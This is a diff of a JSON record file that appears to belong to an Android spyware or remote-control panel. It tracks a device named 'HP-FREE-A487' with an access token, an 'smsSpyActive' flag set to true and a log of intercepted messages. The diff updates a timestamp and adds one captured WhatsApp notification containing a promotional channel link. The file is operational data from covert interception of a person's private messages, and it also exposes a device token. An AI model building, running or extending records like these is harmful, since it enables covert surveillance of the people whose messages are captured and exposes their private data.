@@ -1245,7 +1245,7 @@
     "deviceName": "HP-FREE-A487",
     "ownerUsername": "rian",
     "token": "77751522caef94e9c9f1117d03601776",
-    "lastSeen": 1775189598013,
+    "lastSeen": 1775189603982,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-03T03:51:21.437Z",
@@ -1261,6 +1261,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "‎PROSES DAGET 2JT💸💸💸💸 (18 pesan): ~ all storee",
+        "content": "🔗 stok res denz store | buat kalian yang mau daget 250k langsung aja join SALURAN ini yaaa cuyy \n\nhttps://whatsapp.com/channel/0029Vb7cttv7oQhghUTaMS1T",
+        "time": "03/04 11:13",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775189604892
+      },
       {
         "appName": "WhatsApp",
         "sender": "WhatsApp",
